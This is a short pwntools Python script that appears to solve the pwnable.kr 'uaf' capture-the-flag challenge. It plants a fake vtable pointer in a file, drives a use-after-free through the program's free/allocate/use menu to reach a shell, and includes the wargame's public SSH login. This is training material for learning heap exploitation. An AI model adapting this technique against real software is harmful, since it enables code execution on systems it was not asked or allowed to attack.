#coding=utf-8
from pwn import *

man_vfptr = 0x401570 # 0x401550
open('tmp', 'w').write(p64(man_vfptr - 8))
argv = ['./uaf', '24', './tmp'] 

debug = 1
if debug:
    p = process(argv = argv)
else:
    s = ssh(host = 'pwnable.kr', port = 2222, user = 'uaf', password = 'guest')
    s.set_working_directory('/tmp')
    s.process('echo "{}">>tmp'.format(p64(man_vfptr - 8)), shell=True)
    p = s.process(argv = argv)

p.sendlineafter('free', '3')
p.sendlineafter('free', '2')
p.sendlineafter('free', '2')
p.sendlineafter('free', '1')
p.interactive()
